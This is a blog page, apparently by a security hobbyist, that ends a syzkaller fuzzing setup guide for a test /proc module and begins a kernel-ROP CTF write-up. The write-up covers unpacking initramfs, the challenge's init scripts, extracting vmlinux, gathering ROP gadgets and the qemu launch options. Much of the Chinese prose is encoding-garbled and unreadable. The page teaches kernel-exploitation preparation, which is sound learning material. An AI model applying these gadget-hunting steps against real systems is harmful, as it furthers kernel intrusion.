<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j `<span class="built_in">nproc</span>`</span><br></pre></td></tr></table></figure>



<p>rerun the kernel and check the module loaded</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /proc/test1</span><br></pre></td></tr></table></figure>



<h3 id="2-provide-syscall-descriptions"><a href="#2-provide-syscall-descriptions" class="headerlink" title="2.provide syscall descriptions"></a>2.provide syscall descriptions</h3><p>2.1 save the following syscall descriptions as</p>
<p> <code>/syzkaller/sys/linux/proc_testxy.txt</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">include &lt;linux/fs.h&gt;</span><br><span class="line">open$testxy(file ptr[in, <span class="built_in">string</span>[<span class="string">&quot;/proc/test1&quot;</span>]], flags flags[proc_open_flags], mode flags[proc_open_mode]) fd</span><br><span class="line">read$testxy(fd fd, buf buffer[out], count len[buf])</span><br><span class="line">write$testxy(fd fd, buf buffer[in], count len[buf])</span><br><span class="line"></span><br><span class="line">proc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br><span class="line">proc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure>

<blockquote>
<p>more syzlang :</p>
<p><a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions_syntax.md">https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions_syntax.md</a></p>
</blockquote>
<p>2.2 extract necessary information like syscall numbers and macro values using syz-extract</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /path/to/syzkaller</span><br><span class="line">./bin/syz-extract -os linux -arch amd64 -sourcedir &quot;/path/to/linux-5.14&quot; proc_testxy.txt</span><br></pre></td></tr></table></figure>

<p>check  <code>syzkaller/sys/linux/proc.testxy.txt.const</code>  when finished</p>
<p>2.3 generate syzkaller-awareness datastructure in golang </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /path/to/syzkaller</span><br><span class="line">./bin/syz-sysgen</span><br></pre></td></tr></table></figure>

<p>check <code>syzkaller/executor/syscalls.h</code> to find <code>read$testxy</code> when finished</p>
<p>2.4 rebuild Syzkaller</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make generate </span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<h3 id="3-start-Syzkaller"><a href="#3-start-Syzkaller" class="headerlink" title="3.start Syzkaller"></a>3.start Syzkaller</h3><p>edit a test.cfg file</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1:56741&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;workdir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/workdir&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kernel_obj&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/linux-5.14/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/image/bullseye.img&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sshkey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/image/bullseye.id_rsa&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;syzkaller&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;procs&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qemu&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sandbox&quot;</span><span class="punctuation">:</span> <span class="string">&quot;setuid&quot;</span><span class="punctuation">,</span></span><br><span class="line">        	<span class="attr">&quot;enable_syscalls&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">        		<span class="string">&quot;open$testxy&quot;</span><span class="punctuation">,</span></span><br><span class="line">        		<span class="string">&quot;read$testxy&quot;</span><span class="punctuation">,</span></span><br><span class="line">        		<span class="string">&quot;write$testxy&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;vm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;kernel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/linux-5.14/arch/x86/boot/bzImage&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;mem&quot;</span><span class="punctuation">:</span> <span class="number">2048</span> <span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cmdline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;net.ifnames=0&quot;</span> </span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>then run Syzkaller by</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> syzkaller</span><br><span class="line">./bin/syz-manager -config=./test.cfg -debug</span><br></pre></td></tr></table></figure>

<p>visit <a target="_blank" rel="noopener" href="http://127.0.0.1:56741/">http://127.0.0.1:56741/</a> and wait for crash reports</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20241221210627723.png" alt="image-20241221210627723"></p>
<h2 id="0x3-see-also"><a href="#0x3-see-also" class="headerlink" title="0x3 see also"></a>0x3 see also</h2><p><a target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2019/10/26/syzkaller/">https://blingblingxuanxuan.github.io/2019/10/26/syzkaller/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/11/26/kernel%20rop/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/26/kernel%20rop/" class="post-title-link" itemprop="url">kernel rop</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-26 21:17:00" itemprop="dateCreated datePublished" datetime="2024-11-26T21:17:00+08:00">2024-11-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-12-21 21:09:19" itemprop="dateModified" datetime="2024-12-21T21:09:19+08:00">2024-12-21</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="kernel-pwn"><a href="#kernel-pwn" class="headerlink" title="kernel pwn"></a>kernel pwn</h1><h2 id="environment-setup"><a href="#environment-setup" class="headerlink" title="environment setup"></a>environment setup</h2><p>é€šå¸¸<code>linux kernel pwn</code>é¢˜ç›®æ ‡æ˜¯åœ¨ä¸€ä¸ªæœ‰æ¼æ´çš„å†…æ ¸æ¨¡å—ä¸Šæç ´å</p>
<p>èµ›é¢˜ä¼šç»™è¿™ä¹ˆå‡ æ ·ä¸œè¥¿</p>
<p><code>initramfs.cpio.gz</code>æˆ–è€…ç±»ä¼¼çš„åå­—: å†…å­˜æ–‡ä»¶ç³»ç»Ÿ, é€šå¸¸æ˜¯åŸºäº<code>busybox</code>æ„å»ºçš„ä¸€ä¸ªæœ€ç®€çš„<code>linux</code> æ–‡ä»¶ç³»ç»Ÿç›®å½•, å…¶ä¸­åŒ…å«æœ‰æ¼æ´çš„å†…æ ¸æ¨¡å—</p>
<p><code>vmlinuz</code>: å†…æ ¸é•œåƒ</p>
<p><code>run.sh</code>: <code>qemu</code>å¯åŠ¨è„šæœ¬,<code>qemu</code>ä¼šåŸºäºä¸Šè¿°<code>vmlinuz</code>å’Œ<code>initramfs</code>å¯åŠ¨ä¸€ä¸ªè™šæ‹Ÿæœº</p>
<h3 id="initramfs-cpio-gz"><a href="#initramfs-cpio-gz" class="headerlink" title="initramfs.cpio.gz"></a>initramfs.cpio.gz</h3><p>è¿™ç©æ„å„¿æ˜¯ä¸¤å±‚æ‰“åŒ…ä¹‹åçš„æ–‡ä»¶ç³»ç»Ÿ, <code>cpio</code>åŒ…å¤–é¢åˆå¥—äº†ä¸€ä¸ª<code>gz</code>åŒ…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip initramfs.cpio.gz</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>initramfs.cpio</code>åŒ…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idm &lt; ./initramfs.cpio</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ä¸€ä¸ª<code>linux</code>ç›®å½•ç»“æ„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop/test<span class="meta"># ls</span></span><br><span class="line">bin  etc  geninitramfs.sh  hackme.ko  init  initramfs.cpio  root  sbin  usr</span><br></pre></td></tr></table></figure>

<p>é€šå¸¸è¿™ä¸ªç›®å½•ç®€å•å¾—å¾ˆ</p>
<p><code>hackme.ko</code>: å­˜åœ¨æ¼æ´çš„å†…æ ¸æ¨¡å—</p>
<p><code>init</code>: ç”±<code>shell</code>æˆ–è€…<code>c</code>ç¼–å†™çš„å¯åŠ¨è„šæœ¬</p>
<p><code>bin</code>: ç”±<code>busybox</code>å®ç°çš„<code>linux</code>å‘½ä»¤é›†</p>
<p><code>etc</code>: <code>etc</code>ä¸‹çš„<code>inittab</code>æˆ–è€…<code>init.d/rcS</code>ä¸­æœ‰æ›´å¤šçš„å¼€æœºå¯åŠ¨é¡¹ç›®, æ¯”å¦‚è®¾ç½®<code>uid</code>æˆ–è€…åŠ è½½å†…æ ¸æ¨¡å—ç­‰</p>
<h4 id="cpio"><a href="#cpio" class="headerlink" title="cpio"></a>cpio</h4><h5 id="cpioæ˜¯ä»€ä¹ˆ"><a href="#cpioæ˜¯ä»€ä¹ˆ" class="headerlink" title="cpioæ˜¯ä»€ä¹ˆ?"></a>cpioæ˜¯ä»€ä¹ˆ?</h5><p><code>CPIO(Copy In Copy Out)</code>, åœ¨æ—©æœŸ<code>linux</code>ç³»ç»Ÿä¸­ç”¨äºå°†å¤šä¸ªæ–‡æ¡£æ‰“åŒ…æˆä¸€ä¸ªæ–‡æ¡£ä¼ è¾“ç„¶åå†è§£åŒ…</p>
<h5 id="ä¸ºä»€ä¹ˆä½¿ç”¨cpio"><a href="#ä¸ºä»€ä¹ˆä½¿ç”¨cpio" class="headerlink" title="ä¸ºä»€ä¹ˆä½¿ç”¨cpio?"></a>ä¸ºä»€ä¹ˆä½¿ç”¨<code>cpio</code>?</h5><p>å†…æ ¸åªè®¤<code>cpio</code>æ‰“åŒ…çš„<code>initramfs</code>æ–‡ä»¶åŒ…</p>
<h5 id="å¦‚ä½•ä½¿ç”¨cpio"><a href="#å¦‚ä½•ä½¿ç”¨cpio" class="headerlink" title="å¦‚ä½•ä½¿ç”¨cpio?"></a>å¦‚ä½•ä½¿ç”¨<code>cpio</code>?</h5><p><code>cpio</code>å‘½ä»¤ç”¨èµ·æ¥å¾ˆè¯¡å¼‚, æœ‰å„ç§ç®¡é“æˆ–è€…é‡å®šå‘ç¬¦å·</p>
<p>è¿™æ˜¯å› ä¸º<code>cpio</code>é»˜è®¤ä»æ ‡å‡†è¾“å…¥è·å–æ•°æ®, å¹¶è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡º</p>
<p>å› æ­¤å°†å¤šä¸ªæ–‡ä»¶æ‰“åŒ…è¾“å‡ºæˆä¸€ä¸ªæ–‡ä»¶éœ€è¦å°†æ ‡å‡†è¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶æµ</p>
<p><code>cpio</code>æœ‰ä¸‰ç§å·¥ä½œæ¨¡å¼:<code>copy-out,copy-inï¼Œcopy-pass</code></p>
<p><code>1.copy-out</code>: æŠŠæ–‡ä»¶æ‰“åŒ…, é»˜è®¤è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡º, é€šå¸¸é‡å®šå‘åˆ°æ–‡ä»¶, æ¯”å¦‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.cpio.gz</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆæŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶, è·å¾—æ–‡ä»¶ååˆ—è¡¨</p>
<p>â€‹      <code>-print0</code>:æ–‡ä»¶åä»¥<code>\x00</code>åˆ†å‰²</p>
<p>ç„¶åç®¡é“äº¤ç»™cpioå½’æ¡£</p>
<p>â€‹	<code>--null</code>:æ–‡ä»¶åä»¥<code>\x00</code>åˆ†å‰²</p>
<p>â€‹        <code>-o</code>: è¾“å‡º</p>
<p>â€‹	<code>-v</code>: verbose, è¯¦ç»†æ¨¡å¼, æ‰“å°å·¥ä½œè¿‡ç¨‹</p>
<p>â€‹	<code>--format=newc</code> : ä»¥<code>newc</code>æ ¼å¼å½’æ¡£</p>
<p>ç„¶åç®¡é“äº¤ç»™gzipå‹ç¼©</p>
<p>â€‹	<code>-9</code>æœ€é«˜å‹ç¼©çº§åˆ«</p>
<p>ç„¶åé‡å®šå‘åˆ°æ–‡ä»¶è¾“å‡º</p>
<p>2.<code>copy-in</code>:è§£åŒ…, é»˜è®¤ä»æ ‡å‡†è¾“å…¥è¯»åŒ…, é€šå¸¸é‡å®šå‘åˆ°æ–‡ä»¶è¾“å…¥, æ¯”å¦‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idm &lt; ./initramfs.cpio</span><br></pre></td></tr></table></figure>

<p>é‡å®šå‘è¾“å…¥ä¸º<code>./initramfs.cpio</code>æ–‡ä»¶</p>
<p><code>-i</code>: è§£åŒ…</p>
<p><code>-d</code>: è‡ªåŠ¨å»ºç«‹ç›¸åº”ç›®å½•</p>
<p><code>-m</code>: ä¿ç•™æ–‡ä»¶ä¿®æ”¹æ—¥æœŸ</p>
<p>3.<code>copy-pass</code>: å°†ä¸€ä¸ªç›®å½•æ ‘æ‹·è´åˆ°å¦ä¸€ä¸ªç›®å½•ä¸‹, åªæ˜¯ä¸€ä¸ªæ¬è¿</p>
<h4 id="å¯åŠ¨é¡¹"><a href="#å¯åŠ¨é¡¹" class="headerlink" title="å¯åŠ¨é¡¹"></a>å¯åŠ¨é¡¹</h4><h5 id="etc-inittab"><a href="#etc-inittab" class="headerlink" title="&#x2F;etc&#x2F;inittab"></a>&#x2F;etc&#x2F;inittab</h5><p><code>inittab</code>å¯ä»¥çœ‹ä½œ<code>init</code>è¿›ç¨‹çš„é…ç½®æ–‡ä»¶ï¼Œè§„å®š<code>init</code>è¿›ç¨‹éœ€è¦æ‰§è¡Œçš„åˆå§‹åŒ–ä»»åŠ¡</p>
<p><img src="https://images2018.cnblogs.com/blog/1436095/201807/1436095-20180709194017319-1896253481.png" alt="img"></p>
<p><code>inittab</code>ä¸­æ¯ä¸€è¡Œéƒ½æŒ‰ç…§ä¸‹è¿°è¯­æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">label:runlevel:action:process</span><br></pre></td></tr></table></figure>

<p><code>label</code>: å°±æ˜¯ä¸€ä¸ªå‘½å, ç»™æœ¬è¡Œç™»è®°é¡¹ä¸€ä¸ªå”¯ä¸€æ ‡è¯†</p>
<p><code>runlevel</code>: æŒ‡å®šä»»åŠ¡è¿è¡Œçº§</p>
<p><code>action</code>: æŒ‡å®šå‘½ä»¤æ‰§è¡Œæ—¶æœº</p>
<p><code>process</code>: éœ€è¦æ‰§è¡Œçš„<code>shell</code>å‘½ä»¤</p>
<p>æ¯”å¦‚åœ¨<code>kernel-rop</code>è¿™é“é¢˜ä¸­æ˜¯è¿™æ ·å†™çš„</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::once:-sh -c <span class="string">&#x27;cat /etc/motd; setuidgid 1000 /bin/sh; poweroff&#x27;</span></span><br></pre></td></tr></table></figure>

<p>1.åœ¨ç³»ç»Ÿåˆå§‹åŒ–æ—¶æ‰§è¡Œ<code>/etc/init.d/rcS</code></p>
<p>2.æ‰§è¡Œä¸€æ¬¡æ‰“å°<code>/etc/motd</code>ç„¶åè®¾ç½®æ™®é€šç”¨æˆ·æƒé™(1000), ç„¶åèµ·ä½æƒé™çš„<code>shell</code></p>
<h5 id="etc-init-d-rcS"><a href="#etc-init-d-rcS" class="headerlink" title="&#x2F;etc&#x2F;init.d&#x2F;rcS"></a>&#x2F;etc&#x2F;init.d&#x2F;rcS</h5><p>è¿™ä¸ª<code>/etc/init.d/rcS</code>å¹²äº†å•¥å‘¢?</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">/bin/busybox --install -s			<span class="comment">#åœ¨/usr/binä¸‹é¢åˆ›å»ºls,mkdirç­‰ä¸€ç³»åˆ—å‘½ä»¤,é“¾æ¥åˆ°/usr/bin/busybox</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>						<span class="comment">#set tty, è®¾ç½®ç»ˆç«¯ä¸Šæ‰“å°è¡Œä¸º, æŒºæ€ªå¼‚çš„</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> -R 0:0 /						<span class="comment">#æ‰€æœ‰æ–‡ä»¶å˜æ›´æ‹¥æœ‰è€…ä¸ºroot</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /proc &amp;&amp; mount -t proc none /proc</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev  &amp;&amp; mount -t devtmpfs devtmpfs /dev</span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp  &amp;&amp; mount -t tmpfs tmpfs /tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict			<span class="comment">#ç¦æ­¢æ™®é€šç”¨æˆ·æŸ¥çœ‹/proc/kallsyms</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict		<span class="comment">#ç¦æ­¢æ™®é€šç”¨æˆ·æŸ¥çœ‹dmesgä¿¡æ¯</span></span><br><span class="line"><span class="built_in">chmod</span> 400 /proc/kallsyms						<span class="comment">#/proc/kallsymså¯¹rootåªè¯»,å…¶ä»–ç”¨æˆ·ä¸å¯è®¿é—®</span></span><br><span class="line"></span><br><span class="line">insmod /hackme.ko								<span class="comment">#åŠ è½½å†…æ ¸æ¨¡å—</span></span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/hackme							<span class="comment">#å…è®¸æ‰€æœ‰ç”¨æˆ·è¯»å†™è®¿é—®å†…æ ¸æ¨¡å—hackme.koçš„æ¥å£/dev/hackme</span></span><br></pre></td></tr></table></figure>

<p>ç”±äº<code>inittab</code>ä¸­å·²ç»å°†ç”¨æˆ·é™åˆ¶ä¸ºæ™®é€šç”¨æˆ·(<code>1000</code>), æ­¤æ—¶æ˜¯çœ‹ä¸åˆ°<code>dmesg</code>ä»¥åŠ<code>kallsym</code>çš„, </p>
<p>å› æ­¤å¯ä»¥ä¿®æ”¹<code>inittab</code>ä¸­çš„ç”¨æˆ·<code>id</code>,ä»<code>1000</code>æ”¹æˆ0,ç„¶åé‡æ–°æ‰“åŒ…,å¯åŠ¨è™šæ‹Ÿæœº,æ­¤æ—¶å°±æ˜¯<code>root</code>ç”¨æˆ·äº†</p>
<h3 id="vmlinuz"><a href="#vmlinuz" class="headerlink" title="vmlinuz"></a>vmlinuz</h3><p><code>vmlinuz </code>å°±æ˜¯<code>bzImage</code>,ä¹Ÿå°±æ˜¯å¯ä»¥å¼•å¯¼çš„å†…æ ¸é•œåƒ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># file vmlinuz</span></span><br><span class="line">vmlinuz: Linux kernel x86 boot executable bzImage, version <span class="number">5.9</span><span class="number">.0</span>-rc6+ (martin@martin) #<span class="number">10</span> SMP Sun Nov <span class="number">22</span> <span class="number">16</span>:<span class="number">47</span>:<span class="number">32</span> CET <span class="number">2020</span>, RO-rootFS, swap_dev <span class="number">0X7</span>, Normal VGA</span><br></pre></td></tr></table></figure>

<p><code>vmlinux</code>æ˜¯å†…æ ¸<code>elf</code>æ–‡ä»¶, è€Œ<code>vmlinuz</code>æ˜¯å¯å¼•å¯¼çš„, ç»è¿‡å‹ç¼©çš„å†…æ ¸</p>
<p>ä¸ºäº†æå–å†…æ ¸ä¸­çš„<code>gadget</code>, æˆ‘ä»¬éœ€è¦æœ‰<code>vmlinux elf</code>æ–‡ä»¶</p>
<p>å¯ä»¥ä½¿ç”¨<code>vmlinux-to-elf</code>æˆ–è€…<code>extract-vmlinux</code>å·¥å…·ä»<code>vmlinuz</code>ä¸­æå–<code>vmlinux</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf ./vmlinuz ./vmlinux</span><br></pre></td></tr></table></figure>

<p>æå–å®Œæˆåç”Ÿæˆvmlinux elfæ–‡ä»¶</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop# file vmlinuz</span><br><span class="line">vmlinuz: Linux kernel x86 boot executable bzImage, version 5.9.0-rc6+ (martin@martin) <span class="comment">#10 SMP Sun Nov 22 16:47:32 CET 2020, RO-rootFS, swap_dev 0X7, Normal VGA</span></span><br><span class="line">root@Destroyer:/usr/src/kernel-rop# file vmlinux</span><br><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), too many program (36106)</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ä½¿ç”¨<code>ROPgadget</code>æå–<code>vmlinux</code>ä¸­çš„<code>gadgets</code>,å†™å…¥æ–‡ä»¶å‡†å¤‡ä½¿ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./vmlinux &gt; ./gadgets</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸€è¯´ä¸€, ROPgadgetæ˜¯çœŸæ…¢å§, ç”¨è¿™ä¸ªroprå¿«çš„è·Ÿé©¬ä¸€æ ·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/Ben-Lichtman/ropr</span></span><br></pre></td></tr></table></figure>



<h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><p>qemuå¯åŠ¨è™šæ‹Ÿæœºçš„è„šæœ¬</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \							<span class="comment">#å†…å­˜å¤§å°ä¸º128MB</span></span><br><span class="line">    -cpu kvm64,+smep,+smap \			<span class="comment">#cpué‡‡ç”¨kvm64æ¨¡å‹,å¼€å¯smepå’Œsmapä¿æŠ¤</span></span><br><span class="line">    -kernel vmlinuz \					<span class="comment">#ä½¿ç”¨vmlinuzä½œä¸ºå†…æ ¸é•œåƒ</span></span><br><span class="line">    -initrd initramfs.cpio.gz \			<span class="comment">#æŒ‡å®šå†…å­˜æ–‡ä»¶ç³»ç»Ÿ</span></span><br><span class="line">    -hdb flag.txt \						<span class="comment">#æŒ‡å®šè™šæ‹Ÿç¡¬ç›˜</span></span><br><span class="line">    -snapshot \							<span class="comment">#å¿«ç…§æ¨¡å¼,ä¸ä¼šä¿®æ”¹è™šæ‹Ÿç¡¬ç›˜å†…å®¹,åªä¼šä¿®æ”¹å†…å­˜</span></span><br><span class="line">    -nographic \						<span class="comment">#ä¸ä½¿ç”¨å›¾å½¢ç•Œé¢</span></span><br><span class="line">    -monitor /dev/null \				<span class="comment">#ç¦ç”¨qemu monitoræ¥å£,å®é™…ä¸Šæ˜¯å°†å…¶é‡å®šå‘åˆ°åƒåœ¾æ¡¶</span></span><br><span class="line">    -no-reboot \						<span class="comment">#å³ä½¿å†…æ ¸å´©æºƒä¹Ÿä¸é‡å¯</span></span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti=1 quiet panic=1&quot;</span>	<span class="comment">#é¢å¤–å¯åŠ¨å‚æ•°,æŒ‡å®šæ§åˆ¶å°è®¾å¤‡,å¼€å¯kaslr,kpti</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœéœ€è¦è°ƒè¯•å†…æ ¸,è¿˜å¾—åŠ ä¸Š<code>-s</code>é€‰é¡¹,å¯åŠ¨<code>gdb</code>è°ƒè¯•åŠŸèƒ½</p>
